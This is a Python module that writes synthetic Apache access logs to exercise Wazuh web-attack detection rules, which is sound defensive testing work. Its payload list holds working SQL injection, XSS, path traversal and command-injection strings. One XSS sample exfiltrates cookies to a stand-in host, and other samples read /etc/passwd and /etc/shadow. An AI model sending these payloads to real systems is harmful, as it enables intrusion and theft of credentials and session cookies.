"""
Web application log generator.

Produces Apache "combined" log format. The Wazuh apache-accesslog decoder
+ web-attack ruleset (31100 series, 31500 series) fires on:

  - SQL injection patterns        (rule 31103)
  - XSS attempts                  (rule 31104)
  - Path traversal / LFI          (rule 31106)
  - Common web scan tools (UA)    (rule 31151)
  - 4xx/5xx burst from one IP     (rule 31151 chain)
  - Login brute force (POST /login 401/403)
"""
import random
from pathlib import Path
from datetime import timedelta
from .common import (
    INTERNAL_IPS, EXTERNAL_IPS, ATTACKER_IPS, USER_AGENTS,
    rand_recent, apache_ts, pick,
)

NORMAL_PATHS = [
    "/", "/index.html", "/about", "/products", "/contact",
    "/api/v1/users/me", "/static/css/app.css", "/static/js/bundle.js",
    "/login", "/logout", "/dashboard",
]

ATTACK_PAYLOADS = {
    "sqli": [
        "/products?id=1' OR '1'='1",
        "/login?user=admin'--&pass=x",
        "/search?q=1 UNION SELECT username,password FROM users--",
        "/api/v1/order?id=1; DROP TABLE orders--",
        "/index.php?id=1%27%20AND%20SLEEP%285%29--",
    ],
    "xss": [
        "/search?q=<script>alert(1)</script>",
        "/comment?text=<img src=x onerror=alert(document.cookie)>",
        "/profile?name=<svg/onload=fetch('//evil.example?'+document.cookie)>",
    ],
    "lfi": [
        "/download?file=../../../../etc/passwd",
        "/view?page=....//....//....//etc/shadow",
        "/static?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows/win.ini",
    ],
    "rce": [
        "/api/exec?cmd=;cat /etc/passwd",
        "/cgi-bin/test.cgi?x=`id`",
        "/?search=%24%28id%29",
    ],
}


def _line(ip, ts, method, path, status, size, ua, referer="-"):
    return (f'{ip} - - {apache_ts(ts)} '
            f'"{method} {path} HTTP/1.1" {status} {size} "{referer}" "{ua}"')


def _normal(ts):
    ip = pick(INTERNAL_IPS + EXTERNAL_IPS[:3])
    return _line(
        ip, ts, "GET", pick(NORMAL_PATHS),
        pick([200, 200, 200, 301, 304, 404]),
        random.randint(200, 50000),
        pick(USER_AGENTS[:2]),
    )


def _attack(ts, kind):
    ip = pick(ATTACKER_IPS)
    path = pick(ATTACK_PAYLOADS[kind])
    # Server typically returns 200 (vuln) or 403 (WAF) or 500 (error)
    status = pick([200, 403, 500])
    ua = pick(USER_AGENTS[2:])   # curl / sqlmap / nikto / nmap
    return _line(ip, ts, "GET", path, status, random.randint(100, 5000), ua)


def _login_bruteforce_line(ts, ip):
    return _line(
        ip, ts, "POST", "/login",
        pick([401, 401, 401, 403]),
        random.randint(100, 800),
        pick(USER_AGENTS[2:4]),
        referer="https://app.corp.local/login",
    )


def _scan_line(ts, ip):
    """A scanner-tool request: characteristic UA + /wp-admin /phpmyadmin etc."""
    return _line(
        ip, ts, "GET",
        pick(["/wp-admin/", "/phpmyadmin/", "/.env", "/.git/config",
              "/admin/config.php", "/wp-login.php", "/server-status"]),
        pick([404, 403, 200]),
        random.randint(0, 2000),
        pick(USER_AGENTS[4:7]),   # sqlmap / nikto / nmap
    )


def generate(path: Path, count: int = 40) -> None:
    events = []

    # Baseline normal traffic
    for _ in range(count * 2):
        ts = rand_recent(60)
        events.append((ts, _normal(ts)))

    # Login brute force (15 POST /login 401 from one IP within ~1 min)
    base = rand_recent(20)
    attacker_ip = pick(ATTACKER_IPS)
    for i in range(15):
        ts = base + timedelta(seconds=i * 3)
        events.append((ts, _login_bruteforce_line(ts, attacker_ip)))

    # Attack patterns - mix all categories
    for kind in ["sqli", "xss", "lfi", "rce"]:
        for _ in range(4):
            ts = rand_recent(45)
            events.append((ts, _attack(ts, kind)))

    # Scanner activity (Nikto / sqlmap / nmap)
    scanner_ip = pick(ATTACKER_IPS)
    scan_base = rand_recent(30)
    for i in range(12):
        ts = scan_base + timedelta(seconds=i)
        line = _scan_line(ts, scanner_ip)
        events.append((ts, line))

    events.sort(key=lambda x: x[0])

    with path.open("w", encoding="utf-8") as f:
        for _, line in events:
            f.write(line + "\n")

    print(f"  wrote {len(events)} web access events -> {path.name}")
